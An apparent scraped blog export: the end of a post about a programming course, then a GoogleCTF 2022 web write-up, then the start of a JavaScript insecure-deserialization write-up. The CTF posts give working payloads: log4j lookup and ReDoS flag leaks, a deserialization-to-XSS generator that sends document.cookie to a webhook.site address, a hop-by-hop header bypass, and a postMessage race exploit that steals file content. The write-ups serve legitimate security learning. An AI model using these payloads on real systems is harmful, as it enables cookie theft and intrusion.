explaining, the teacher talked about many things that I originally prepared to ask, and the way of explanation is easy to understand because the reasons are explained, so it is easy to accept. Just like arranging the course, each chapter is gradually progressive, so it is easy to understand and accept why to use these things and the benefits of these things. Explaining the program makes people feel that writing code can be so clear and simple. The explanation process seems easy but has a structure. When classmates don’t understand, the teacher will explain from many different angles, such as using examples from daily life or various related links to deepen classmates’ understanding and impression of the program! I really like that the teacher lets the students write first and then publish the answers. This allows students to have the opportunity to try various possible solutions that they think of or find first. When it comes to live classes, the teacher’s approach can provide opportunities for mutual exchange and discussion, and it won’t make students go to class with an empty head. Because they have already completed the assignments, they can absorb and integrate more easily in class, and they can quickly understand which solution is suitable for which situation and can immediately see where they were stuck before because they have already been stuck. In this programming course, I also found that thinking about writing code is not as complicated as I imagined. Maybe it’s because the teacher’s outline is clear and clean, and the explanation is based on “requirements”. Some beginners, like me, often spend a lot of time in the development process, always writing code that they don’t understand what they are doing or why they are writing it. Thinking about writing code is the precious harvest I learned in this programming course. ConclusionFirst of all, I would like to thank my students for accompanying me through ten weeks of courses and being willing to give feedback after the course. I have always felt that programming education should have better methods to help students learn faster and understand faster. This course has verified that my current direction is correct, and I will continue to move in this direction in the future. If you are interested in this course, you can go to the Github page to view the course content, or go to Youtube to watch the videos directly. You can also register for the course on my recently launched online course platform: Lidemy Lithium Academy, which is completely free! I have uploaded the homework content and videos there. (However, since the course has ended, no one will help you with your homework.) I believe that the value of this course lies in the teaching mode of “doing homework first and then explaining”. Therefore, I don’t intend to profit from releasing the teaching videos like the one above. All resources are completely free and open for everyone to use, because the core value of this course has been lost, so there is no need to charge for it. I hope that my course can be open and transparent in all aspects. Therefore, if you are interested in the feedback form submitted by students after the course, here is a complete backup of the student feedback (with some personal information deleted). Finally, thank you for taking the time to read this lengthy article. If you are interested in my future teaching experiments or courses, please follow the Lidemy Lithium Academy fan page, where all future updates will be announced. Thank you.","link":"/2017/06/03/en/frontend-tutorial-experiment/"},{"title":"GoogleCTF 2022 Notes","text":"This is my first time participating in GoogleCTF. I solved a web problem (HORKOS) and almost solved another one (POSTVIEWER). Here are the solutions for each web problem, sorted by the number of solves. The keywords are as follows: log4j ReDoS hop by hop JavaScript magic function(?) async&#x2F;await and Promise race condition LOG4J(105 solves)My teammates quickly solved this problem, so I didn’t look into it too much. In short, there is a Java web service that uses log4j to print out the data you enter: public class App &#123; public static Logger LOGGER = LogManager.getLogger(App.class); public static void main(String[]args) &#123; String flag = System.getenv(\"FLAG\"); if (flag == null || !flag.startsWith(\"CTF\")) &#123; LOGGER.error(\"&#123;&#125;\", \"Contact admin\"); &#125; LOGGER.info(\"msg: &#123;&#125;\", args); // TODO: implement bot commands String cmd = System.getProperty(\"cmd\"); if (cmd.equals(\"help\")) &#123; doHelp(); return; &#125; if (!cmd.startsWith(\"/\")) &#123; System.out.println(\"The command should start with a /.\"); return; &#125; doCommand(cmd.substring(1), args); &#125; Although the version of log4j used in this problem is not the vulnerable version, the parameters are controllable. Therefore, let’s take a look at some of the custom lookups of log4j: https://logging.apache.org/log4j/2.x/manual/lookups.html $&#123;env:FLAG&#125; represents the flag in the environment variables, and $&#123;java:runtime&#125; will print out Java-related information. Combining the two becomes: $&#123;java:$&#123;env:FLAG&#125;&#125;, which will output an error message and the flag: 2022-07-08 01:31:16,285 main ERROR Resolver failed to lookup java:CTF&#123;d95528534d14dc6eb6aeb81c994ce8bd&#125; java.lang.IllegalArgumentException: CTF&#123;d95528534d14dc6eb6aeb81c994ce8bd&#125; at org.apache.logging.log4j.core.lookup.JavaLookup.lookup(JavaLookup.java:116) at org.apache.logging.log4j.core.lookup.StrLookup.evaluate(StrLookup.java:119) at org.apache.logging.log4j.core.lookup.Interpolator.evaluate(Interpolator.java:190) at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1183) at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1098) at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:974) at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:488) at ..... LOG4J2 (43 solves)Similar to the first problem, but the error message is not displayed, so other methods can be used to leak the flag. For example, my teammates used: %replace&#123;$&#123;env:FLAG&#125;%repeat&#123;x&#125;&#123;200000000&#125;&#125;&#123;CTF.*&#125;&#123;y&#125; %replace&#123;$&#123;env:FLAG&#125;%repeat&#123;x&#125;&#123;200000000&#125;&#125;&#123;CTX.*&#125;&#123;y&#125; Generate a long string and replace it with a replace string. Determine whether it contains a certain character based on the final time. The former takes about 4-5 seconds, and the latter takes more than 7 seconds. You can also refer to the ReDoS constructed by maple: %replace&#123;S$&#123;env:FLAG&#125;E&#125;&#123;^SCTF.a((((((((((((((((((((.)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*E$&#125;&#123;&#125; The flag can also be slowly found from the time difference. HORKOS (10 solves)This is the only problem I solved by myself, and it was quite interesting. This problem is like a shopping website. After selecting the items you want on the front end, a JSON package will be generated and sent to /order: const script = new VMScript(fs.readFileSync('./shoplib.mjs').toString().replaceAll('export ','') + ` sendOrder(cart, orders) `); app.post('/order', recaptcha.middleware.verify, async (req,res)=>&#123; req.setTimeout(1000); if (req.recaptcha.error &amp;&amp; process.env.NODE_ENV != \"dev\") &#123; res.writeHead(400, &#123;'Content-Type': 'text/html'&#125;); return await res.end(\"invalid captcha\"); &#125; if (!req.body.cart) &#123; res.writeHead(400, &#123;'Content-Type': 'text/html'&#125;); return await res.end(\"bad request\") &#125; // TODO: Group orders by zip code let orders = []; let cart = req.body.cart; let vm = new VM(&#123;sandbox: &#123;orders, cart&#125;&#125;); let result = await vm.run(script); orders = new Buffer.from(JSON.stringify(orders)).toString('base64'); let url = '/order#' + orders; bot.visit(CHALL_URL + url); res.redirect(url); &#125;); Along the way, a sandbox is opened to run the items in shoplib.mjs, and finally the generated JSON is base64 encoded and sent to /order. Let’s take a look at what /order does: import * as shop from \"/js/shoplib.mjs\"; window.onload = () => &#123; let orders = JSON.parse(atob(location.hash.substr(1))); console.log(orders); (orders).forEach((order) => &#123; const client = new shop.DeliveryClient(order); document.all.order.innerHTML += client; &#125;) &#125; Basically, it takes the orders on the URL and calls new shop.DeliveryClient. The code is roughly like this: const escapeHtml = (str) => str.includes('&lt;') ? str.replace(/&lt;/g, c => `&amp;#$&#123;c.charCodeAt()&#125;;`) : str; const renderLines = (arr) => arr.reduce((p,c) => p+` &lt;div class=\"row\"> &lt;div class=\"col-xl-8\"> &lt;p>$&#123;escapeHtml(c.key).toString()&#125;&lt;/p> &lt;/div> &lt;div class=\"col-xl-2\"> &lt;p class=\"float-end\">$&#123;escapeHtml(getValue(c.value, 'quantity').toString())&#125; &lt;/p> &lt;/div> &lt;div class=\"col-xl-2\"> &lt;p class=\"float-end\">$&#123;escapeHtml(getValue(c.value, 'price').toString())&#125; &lt;/p> &lt;/div> &lt;hr> &lt;/div>`, ''); const getValue = (a, p) => p.split('/').reduce((arr,k) => arr.filter(e=>e.key==k)[0].value, a); const renderOrder = (arr) => &#123; return ` &lt;div class=\"container\"> &lt;p class=\"my-5 mx-5\" style=\"font-size: 30px;\">Delivery Information&lt;/p> &lt;div class=\"row\"> &lt;ul class=\"list-unstyled\"> &lt;li class=\"text-black\">$&#123;escapeHtml(getValue(arr,'cart/address/street').toString())&#125; $&#123;escapeHtml(getValue(arr,'cart/address/number').toString())&#125;&lt;/li> &lt;li class=\"text-muted mt-1\">&lt;span class=\"text-black\">Invoice&lt;/span> #$&#123;escapeHtml(getValue(arr, 'orderId').toString())&#125;&lt;/li> &lt;li class=\"text-black mt-1\">$&#123;new Date().toDateString()&#125;&lt;/li> &lt;/ul> &lt;hr> &lt;/div> $&#123;renderLines(getValue(arr, 'cart/items'))&#125; &lt;div class=\"row text-black\"> &lt;div class=\"col-xl-12\"> &lt;p class=\"float-end fw-bold\">Total: $1337 &lt;/p> &lt;/div> &lt;hr style=\"border: 2px solid black;\"> &lt;/div> &lt;div class=\"text-center\" style=\"margin-top: 90px;\"> &lt;p>Delivered by $&#123;escapeHtml(getValue(arr, 'driver/username').toString())&#125;. &lt;/p> &lt;/div> &lt;/div> `; &#125;; export class DeliveryClient &#123; constructor(pickledOrder) &#123; this.pickledOrder = pickledOrder; &#125; toString() &#123; return renderOrder(this.pickledOrder); &#125; &#125;; You can see that escapeHtml is used before the output of the items, except for this part in renderLines: &lt;div class=\"col-xl-8\"> &lt;p>$&#123;escapeHtml(c.key).toString()&#125;&lt;/p> &lt;/div> Everywhere else is toString and then escapeHtml, but here it is the opposite. What is the difference? Let’s take a look at the implementation of escapeHtml: const escapeHtml = (str) => str.includes('&lt;') ? str.replace(/&lt;/g, c => `&amp;#$&#123;c.charCodeAt()&#125;;`) : str; When escaping, it first checks str.includes, so if str is an array, the filter can be bypassed, achieving XSS. Therefore, the goal of this problem is to make c.key, which is item.key, an array, so that XSS can be achieved. To achieve this, we need to see what the server has done, because we call sendOrder(cart, orders) on the server, and finally generate orders. Let’s take a look at how it was generated: export const pickle = &#123; PRIMITIVES: ['String', 'Number', 'Boolean'], loads: json => &#123; const obj = &#123;&#125;; for (const &#123;key, type, value&#125; of json) &#123; if (type.match(/^pickled/)) &#123; obj[key] = pickle.loads(value); const constructor = type.replace(/^pickled/, ''); obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype; &#125; else &#123; obj[key] = new globalThis[type](value); &#125; &#125; return obj; &#125;, dumps: obj => &#123; const json = []; for (const key in obj) &#123; const value = obj[key]; const type = value.constructor.name; if (typeof type !== 'string') continue; if (typeof value == 'object' &amp;&amp; !pickle.PRIMITIVES.includes(type)) &#123; json.push(&#123; key, type: 'pickled' + type, value: pickle.dumps(value) &#125;); &#125; else if (typeof value !== 'undefined') &#123; json.push(&#123; key, type, value: globalThis[type].prototype.valueOf.call(value) &#125;); &#125; &#125; return json; &#125; &#125;; const DRIVERS = ['drivefast1', 'johnnywalker', 'onagbike']; export const sendOrder = async (value, orders) => &#123; const delivery = new DeliveryService(new Order( pickle.loads(JSON.parse(value))[0] ), orders); return delivery.sendOrder(); &#125;; export class Driver &#123; constructor(username, orders) &#123; this.username = username; this.orders = orders; &#125; async sendOrder(order) &#123; order.driver = this; const pickledOrder = pickle.dumps(order); this.orders.push(pickledOrder); return true; &#125; &#125;; export class DeliveryClient &#123; constructor(pickledOrder) &#123; this.pickledOrder = pickledOrder; &#125; toString() &#123; return renderOrder(this.pickledOrder); &#125; &#125;; export class DeliveryService &#123; constructor(order, orders) &#123; this.order = order; this.orders = orders; &#125; findDriver() &#123; return new Driver( DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders); &#125; async sendOrder() &#123; const driver = this.findDriver(); if (await driver.sendOrder(this.order)) &#123; return this.order.orderId; &#125; &#125; &#125;; export class Order &#123; constructor(cart) &#123; this.cart = cart; this.driver = null; this.orderId = this.cart.shoppingCartId; &#125; &#125;; export class ShoppingCart &#123; constructor() &#123; this.items = &#123;&#125;; this.address = ''; this.shoppingCartId = Math.floor(Math.random() * 1000000000000); &#125; addItem(key, item) &#123; this.items[key] = item; &#125; removeItem(key) &#123; delete this.items[key]; &#125; &#125;; export class Item &#123; constructor(price) &#123; this.price = price; &#125; setQuantity(num) &#123; this.quantity = num; &#125; &#125;; export class Address &#123; constructor(street, number, zip) &#123; this.street = street; this.number = number; this.zip = zip; &#125; &#125;; This code is actually quite long, but in simple terms, the cart passed in will look like this: [ &#123; 'key': 'cart', 'type': 'pickledShoppingCart', 'value': [ &#123; 'key': 'items', 'type': 'pickledObject', 'value': [ &#123; 'key': 'abc', 'type': 'pickledItem', 'value': [ &#123; 'key': 'price', 'type': 'Number', 'value': 10 &#125;, &#123; 'key': 'quantity', 'type': 'String', 'value': '1' &#125; ] &#125; ] &#125;, &#123; 'key': 'address', 'type': 'pickledAddress', 'value': [ &#123; 'key': 'street', 'type': 'String', 'value': '' &#125;, &#123; 'key': 'number', 'type': 'Number', 'value': 0 &#125;, &#123; 'key': 'zip', 'type': 'Number', 'value': 0 &#125; ] &#125;, &#123; 'key': 'shoppingCartId', 'type': 'String', 'value': 800600798186 &#125; ] &#125;, &#123; 'key': 'driver', 'type': 'pickledDriver', 'value': [ &#123; 'key': 'username', 'type': 'String', 'value': 'johnnywalker' &#125;, &#123; 'key': 'orders', 'type': 'pickledArray', 'value': [] &#125; ] &#125;, &#123; 'key': 'orderId', 'type': 'String', 'value': 'abc123' &#125; ] It can be thought of as a serialized result, and on the server, pickle.loads(JSON.parse(value))[0] is used to restore it to various classes. The most suspicious part of this process is actually the related functions of pickle: export const pickle = &#123; PRIMITIVES: ['String', 'Number', 'Boolean'], loads: json => &#123; const obj = &#123;&#125;; for (const &#123;key, type, value&#125; of json) &#123; if (type.match(/^pickled/)) &#123; obj[key] = pickle.loads(value); const constructor = type.replace(/^pickled/, ''); obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype; &#125; else &#123; obj[key] = new globalThis[type](value); &#125; &#125; return obj; &#125;, dumps: obj => &#123; const json = []; for (const key in obj) &#123; const value = obj[key]; const type = value.constructor.name; if (typeof type !== 'string') continue; if (typeof value == 'object' &amp;&amp; !pickle.PRIMITIVES.includes(type)) &#123; json.push(&#123; key, type: 'pickled' + type, value: pickle.dumps(value) &#125;); &#125; else if (typeof value !== 'undefined') &#123; json.push(&#123; key, type, value: globalThis[type].prototype.valueOf.call(value) &#125;); &#125; &#125; return json; &#125; &#125;; What I noticed at the beginning was the section obj[key] = new globalThis[type](value);. If type is Function, we can generate a function. If we can find a way to call that function, we can execute code in the sandbox and tamper with orders and so on. Another thing I noticed was: obj[key] = pickle.loads(value); const constructor = type.replace(/^pickled/, ''); obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype; The return value of pickle.loads here must be an object, and with that obj[key].__proto__, we can actually make an object’s __proto__ become a String or Number object, etc., but it doesn’t seem to help. I also tried changing the key to __proto__, thinking that this way we could change obj.__proto__.__proto__, but this error was thrown: TypeError: Immutable prototype object &#39;#&lt;Object&gt;&#39; cannot have their prototype set I actually struggled with this problem for quite a while. My original thinking was that executing code might be too difficult, and maybe we could mess with __proto__ to make the final output key an array. But then I carefully looked at the code that was finally dumped: const json = []; for (const key in obj) &#123; const value = obj[key]; const type = value.constructor.name; if (typeof type !== 'string') continue; if (typeof value == 'object' &amp;&amp; !pickle.PRIMITIVES.includes(type)) &#123; json.push(&#123; key, type: 'pickled' + type, value: pickle.dumps(value) &#125;); &#125; else if (typeof value !== 'undefined') &#123; json.push(&#123; key, type, value: globalThis[type].prototype.valueOf.call(value) &#125;); &#125; &#125; return json; Your key is taken out from for in, guaranteed to be a string, so the output key here will always be a string no matter what. Therefore, if you want the key in orders to be an array, you must be able to execute code to directly manipulate orders. At this point, I paused for a moment and returned to the essence of this problem: deserialization. In PHP, Python, or Java, there are vulnerabilities related to deserialization that can be exploited, and the way to do it is to find some gadgets, which are combinations of magic methods. This problem should be the same. So I looked at the code again and tried to find any implicit type conversions that could be used to construct a toString or valueOf to execute code, but I didn’t find any. Although I didn’t see these things, I did find a place that I thought had a chance: export class DeliveryService &#123; constructor(order, orders) &#123; this.order = order; this.orders = orders; &#125; findDriver() &#123; return new Driver( DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders); &#125; async sendOrder() &#123; const driver = this.findDriver(); if (await driver.sendOrder(this.order)) &#123; return this.order.orderId; &#125; &#125; &#125;; The key is that sendOrder and what it finally returns. In JS, if you return a Promise in an async function, it will be resolved, as follows: async function test() &#123; const p = new Promise(resolve => &#123; console.log(123) resolve() &#125;) return p &#125; test() You can see that 123 is printed to the console, and the outer call does not need to await. Therefore, if this.order.orderId is a Promise, you can sneak code in the then. Let’s do an experiment right away: async function test() &#123; var obj = &#123; then: function(resolve) &#123; console.log(123) resolve() &#125; &#125; obj.__proto__ = Promise.prototype return obj &#125; test() After execution, 123 was successfully output, indicating that this idea is feasible. So, we only need to construct such a JSON to execute code in the sandbox and modify orders: &#123; \"key\":\"shoppingCartId\", \"type\":\"pickledPromise\", \"value\":[ &#123; \"key\":\"then\", \"type\":\"Function\", \"value\":\"globalThis.orders.push(JSON.parse('\"+payload+\"'));arguments[0]();\" &#125; ] &#125; (arguments[0] in the code is the resolve parameter, which will be stuck if not called.) Finally, the code I used to test and generate the payload is as follows: const &#123;VM, VMScript&#125; = require(\"vm2\"); const fs = require('fs'); const script = new VMScript(fs.readFileSync('./myshoplib.mjs').toString().replaceAll('export ','') + ` sendOrder(cart, orders) `); async function main () &#123; let orders = []; let payload = JSON.stringify([ &#123; 'key': 'cart', 'type': 'pickledShoppingCart', 'value': [ &#123; 'key': 'items', 'type': 'pickledObject', 'value': [ &#123; 'key': ['&lt;img src=x onerror=\"location=`https://webhook.site/d8dc1452-8e82-408d-9dcf-8ad713754f36/?q=$&#123;encodeURIComponent(document.cookie)&#125;`\">'], 'type': 'pickledItem', 'value': [ &#123; 'key': 'price', 'type': 'Number', 'value': 10 &#125;, &#123; 'key': 'quantity', 'type': 'String', 'value': '1' &#125; ] &#125; ] &#125;, &#123; 'key': 'address', 'type': 'pickledAddress', 'value': [ &#123; 'key': 'street', 'type': 'String', 'value': '' &#125;, &#123; 'key': 'number', 'type': 'Number', 'value': 0 &#125;, &#123; 'key': 'zip', 'type': 'Number', 'value': 0 &#125; ] &#125;, &#123; 'key': 'shoppingCartId', 'type': 'String', 'value': 800600798186 &#125; ] &#125;, &#123; 'key': 'driver', 'type': 'pickledDriver', 'value': [ &#123; 'key': 'username', 'type': 'String', 'value': 'johnnywalker' &#125;, &#123; 'key': 'orders', 'type': 'pickledArray', 'value': [] &#125; ] &#125;, &#123; 'key': 'orderId', 'type': 'String', 'value': 'PEW' &#125; ]).replaceAll('\"', '\\\\\"') let cart = JSON.stringify( [&#123;\"key\":\"0\",\"type\":\"pickledShoppingCart\",\"value\":[&#123;\"key\":\"items\",\"type\":\"pickledObject\",\"value\":[&#123;\"key\":\"Tomato\",\"type\":\"pickledItem\",\"value\":[&#123;\"key\":\"price\",\"type\":\"Number\",\"value\":10&#125;,&#123;\"key\":\"quantity\",\"type\":\"String\",\"value\":\"1\"&#125;]&#125;,&#123;\"key\":\"Pickle\",\"type\":\"pickledItem\",\"value\":[&#123;\"key\":\"price\",\"type\":\"Number\",\"value\":8&#125;,&#123;\"key\":\"quantity\",\"type\":\"String\",\"value\":\"0\"&#125;]&#125;,&#123;\"key\":\"Pineapple\",\"type\":\"pickledItem\",\"value\":[&#123;\"key\":\"price\",\"type\":\"Number\",\"value\":44&#125;,&#123;\"key\":\"quantity\",\"type\":\"String\",\"value\":\"0\"&#125;]&#125;]&#125;,&#123;\"key\":\"address\",\"type\":\"pickledAddress\",\"value\":[&#123;\"key\":\"street\",\"type\":\"String\",\"value\":\"1\"&#125;,&#123;\"key\":\"number\",\"type\":\"Number\",\"value\":0&#125;,&#123;\"key\":\"zip\",\"type\":\"Number\",\"value\":0&#125;]&#125;,&#123;\"key\":\"shoppingCartId\",\"type\":\"pickledPromise\",\"value\":[&#123;\"key\":\"then\",\"type\":\"Function\",\"value\":\"globalThis.orders.push(JSON.parse('\"+payload+\"'));arguments[0]();\"&#125;]&#125;]&#125;] ); let vm = new VM(&#123;sandbox: &#123;orders, cart, console&#125;&#125;); console.log('before') try &#123; let result = await vm.run(script); &#125; catch(err)&#123; console.log('err', err) &#125; console.log('after') console.log('orders') console.log(orders) console.log(encodeURIComponent(cart)) //console.log(orders[0][0].value[0]) &#125; main() POSTVIEWER (10 solves)The core code of this problem is directly attached below: const SHIM = `&lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> &lt;title>SHIM&lt;/title> &lt;/head> &lt;body> &lt;script> onmessage = (e) => &#123; if (e.data.body === undefined || !e.data.mimeType) &#123; return; &#125;; const blob = new Blob([e.data.body], &#123; type: e.data.mimeType &#125;); onunload = () => e.source.postMessage(\"blob loaded\", \"*\"); location = URL.createObjectURL(blob); &#125;; &lt;\\\\/script> &lt;/body> &lt;/html>` const SHIM_DATA_URL = `data:text/html,&lt;script> location=URL.createObjectURL(new Blob([\\`$&#123;SHIM&#125;\\`], &#123;type:\"text/html\"&#125;)) &lt;/script>`; async function previewIframe(container, body, mimeType) &#123; var iframe = document.createElement('iframe'); iframe.src = SHIM_DATA_URL; container.appendChild(iframe); iframe.addEventListener('load', () => &#123; iframe.contentWindow?.postMessage(&#123; body, mimeType &#125;, '*'); &#125;, &#123; once: true &#125;); &#125; When you call previewIframe, an iframe is first generated, and then the HTML inside is generated in another HTML using location=URL.createObjectURL, and onmessage is used to listen for messages. After the iframe is successfully loaded, postMessage is used to send the content to be displayed. However, there is a race condition problem with this approach. If we keep sending postMessage to the iframe, we can render the content we need before the iframe’s onload event is triggered, allowing us to control the content inside the iframe. The ideal process for this problem is as follows: previewIframe is called. An iframe is created and SHIM is loaded. SHIM is loaded successfully and starts listening for messages. Our postMessage is successful and our content starts loading. Our content is loaded successfully. The onload event of the iframe is triggered, and iframe.contentWindow?.postMessage is executed. Our HTML receives the file content and successfully steals the file. When I was solving this problem, I encountered a problem with the order of steps 5 and 6. No matter what I tried, I could only achieve: “Our content is indeed loaded, but we missed the outer postMessage.” Initially, my idea was to send messages aggressively to win the race condition, like this: function send() &#123; w[0]?.postMessage(&#123; body: 'test', mimeType: 'text/html' &#125;, '*') setTimeout(send, 0) &#125; send() However, I found that even XSS could not be triggered in this way, but changing the timeout to a larger value, such as 20, could. Later, I did some experiments and realized why this couldn’t be done. It’s because of this part: onmessage = (e) => &#123; if (e.data.body === undefined || !e.data.mimeType) &#123; return; &#125;; const blob = new Blob([e.data.body], &#123; type: e.data.mimeType &#125;); onunload = () => e.source.postMessage(\"blob loaded\", \"*\"); location = URL.createObjectURL(blob); &#125;; Note that after location = URL.createObjectURL(blob) is executed, the location will not switch immediately. Therefore, if we keep sending messages, onmessage will keep triggering, and the location line will keep being triggered. The previous location has not finished loading, and a new one is assigned, becoming an infinite loop. The reason why increasing the timeout works is that if the location loading time is less than 20ms, the page will be switched when the new message is sent, so XSS can be successfully triggered. Also, I did an experiment and found that the loading of location is unrelated to the UI thread, that is: location = '//example.com' while(1)&#123;&#125; This code will still successfully switch pages without any problems. The most difficult part of this problem is determining the timing of sending messages. Why do we have to keep sending messages? Because we don’t know exactly when to send them, so we have to keep trying. We can wait for the iframe to be ready before sending messages, but at that time, the iframe has not loaded SHIM, so sending messages is useless. So how do we know when SHIM has loaded successfully? We don’t know, so it’s complicated. Later, I continued to experiment and found that we can delay the main thread by constantly changing the hash or using a very time-consuming selector, but we still cannot control the order, and in the end, I couldn’t solve it. The official solution is here: https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710 After reading it, I realized that I had the order wrong. I was always thinking about delaying the main thread, but because the main page and the iframe are different processes, we only need to detect when the iframe is loaded successfully, and then find a way to delay the main thread. At this time, the iframe is still loading SHIM, but onload is temporarily blocked and will not be triggered. At this point, we only need to wait for a period of time (the official solution is 500ms) before sending postMessage. At that time, SHIM has been loaded, and although the main thread is still blocked, the iframe is still loading. In this way, when the main thread is free to do something, our iframe has already been loaded, and we can get the data. GPUSHOP2 (7 solves)This problem was modified from last year’s version, and the solution from last year can be found here: https://github.com/ComdeyOverFlow/Google_CTF_2021/blob/main/gpushop.md I didn’t look at it very carefully, but it should be caused by URL encoding a certain path, which leads to the proxy not matching the path. This year’s version fixed last year’s problem by always adding an X-Wallet: EMPTY header, so last year’s solution cannot be used. The final solution is hop-by-hop headers. What is that? HTTP request headers can be divided into two types: End-to-end Hop-by-hop Because when you send an HTTP request, it may go through a proxy, right? Hop-by-hop headers are headers that are intended for the proxy. The proxy will process them and may not forward them to the next server after processing. The following are all hop-by-hop headers: Connection Keep-Alive Proxy-Authenticate Proxy-Authorization TE Trailers Transfer-Encoding Upgrade In addition, according to the spec, headers placed in Connection should also be treated as hop-by-hop. For example: Connection: close, X-Foo, X-Bar This tells the proxy to treat X-Foo and X-Bar as hop-by-hop headers and remove them, not to send them to the next proxy. Therefore, for this question, we can use this feature to remove X-Wallet: Connection: X-Wallet For more related research, please refer to this article: https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers POSTVIEWER Script BackupHere is the official answer script backup. It seems to use postMessage + onmessage to achieve the effect of an asynchronous infinite loop, which is quite interesting. &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\" /> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /> &lt;title>POC Vulnerable website&lt;/title> &lt;/head> &lt;body> &lt;h1>Click me!&lt;/h1> &lt;iframe style=\"width:1px;height:1px\" name=\"loop\">&lt;/iframe> &lt;pre id=\"log\">&lt;/pre> &lt;script> const URL = 'https://postviewer-web.2022.ctfcompetition.com'; const sleep = (d) => new Promise((r) => setTimeout(r, d)); function notify(...args)&#123; navigator.sendBeacon('', args); console.log(...args); &#125; async function load(win, url) &#123; const buffer = new Uint8Array(1e7); win.location = 'about:blank'; await new Promise((resolve) => &#123; loop.onmessage = () => &#123; try &#123; win.origin; resolve(); &#125; catch (e) &#123; loop.postMessage(null); &#125; &#125;; loop.postMessage(null); &#125;); win.location = url; await new Promise((resolve) => &#123; loop.onmessage = () => &#123; if (win.length === 1) &#123; // Send a huge message so e.data.toString() blocks a thread for a while // By transfering only a reference to memory chunk, sending the message // will be fast enough to race condition window.onmessage and iframe.onload // notify(Date.now(), '==1'); win?.postMessage(buffer, '*', [buffer.buffer]); // Once we know the innerIframe loaded, we can now postMessage to it // because it will be rendered in a different process in Chrome, so // the blocked parent thread won't affect rendering the iframe! setTimeout(() => &#123; win[0]?.postMessage( &#123; body: `LOL! &lt;script>onmessage=async (e)=>&#123; let text = await e.data.body.text(); parent.opener.postMessage(&#123;stolen: text&#125;, '*'); &#125;&lt;\\/script>`, mimeType: \"text/html\", &#125;, \"*\" ); resolve(); &#125;, 500); &#125; else &#123; loop.postMessage(null); &#125; &#125;; loop.postMessage(null); &#125;); return 1; &#125; var TIMEOUT = 1500; var win; function waitForMessage(url) &#123; return new Promise(async resolve => &#123; onmessage = e => &#123; if (e.data.stolen) &#123; notify(e.data.stolen); log.innerText += e.data.stolen + '\\n'; resolve(false); &#125; &#125; const rnd = 'a' + Math.random().toString(16).slice(2); const _url = url + ',' + rnd; await load(win, _url); setTimeout(() => &#123; resolve(true); &#125;, TIMEOUT); &#125;); &#125; onload = onclick = async () => &#123; if (!win || win.closed) &#123; win = open('about:blank', 'hack', 'width=800,height=300,top=500'); &#125; for (let i = 1; i &lt; 100; i++) &#123; const url = `$&#123;URL&#125;/#a,.list-group-item:nth-child($&#123;i&#125;)`; while (await waitForMessage(url)); &#125; &#125;; &lt;/script> &lt;/body> &lt;/html>","link":"/2022/07/09/en/google-ctf-2022-writeup/"},{"title":"Insecure Deserialization in JavaScript: GoogleCTF 2022 Web/HORKOS Writeup","text":"We all heard about insecure deserialization vulnerability and saw many real-world cases in Java, PHP, and other languages. But, we rarely hear about this vulnerability in JavaScript. I think it’s because the built-in serialization&#x2F;deserialization function JSON.parse and JSON.stringify are only for basic data structures like string, number, array and object. Class and function are not supported, so there is no way to run malicious code during deserialization. What if we implement our deserialization logic and support class and function? What could possibly go wrong? GoogleCTF 2022 has a web challenge called “HORKOS,” which shows us the way. OverviewBefore digging into the vulnerability in the challenge, we need to know how it works first. This challenge is like a shopping website: After selecting what you want and pressing the “CHECKOUT” button, a request will be sent to POST /order with a JSON string. Here is what the JSON looks like when I add one tomato to my shopping cart: [ &#123; \"key\":\"0\", \"type\":\"pickledShoppingCart\", \"value\":[ &#123; \"key\":\"items\", \"type\":\"pickledObject\", \"value\":[ &#123; \"key\":\"Tomato\", \"type\":\"pickledItem\", \"value\":[ &#123; \"key\":\"price\", \"type\":\"Number\", \"value\":10 &#125;, &#123; \"key\":\"quantity\", \"type\":\"String\", \"value\":\"1\" &#125; ] &#125;, &#123; \"key\":\"Pickle\", \"type\":\"pickledItem\", \"value\":[ &#123; \"key\":\"price\", \"type\":\"Number\", \"value\":8 &#125;, &#123; \"key\":\"quantity\", \"type\":\"String\", \"value\":\"0\" &#125; ] &#125;, &#123; \"key\":\"Pineapple\", \"type\":\"pickledItem\", \"value\":[ &#123; \"key\":\"price\", \"type\":\"Number\", \"value\":44 &#125;, &#123; \"key\":\"quantity\", \"type\":\"String\", \"value\":\"0\" &#125; ] &#125; ] &#125;, &#123; \"key\":\"address\", \"type\":\"pickledAddress\", \"value\":[ &#123; \"key\":\"street\", \"type\":\"String\", \"value\":\"my\" &#125;, &#123; \"key\":\"number\", \"type\":\"Number\", \"value\":0 &#125;, &#123; \"key\":\"zip\", \"type\":\"Number\", \"value\":0 &#125; ] &#125;, &#123; \"key\":\"shoppingCartId\", \"type\":\"Number\", \"value\":462044767240 &#125; ] &#125; ] After that, the user will be redirected to another /order page to see the order: It’s worth noting that the URL looks like this: 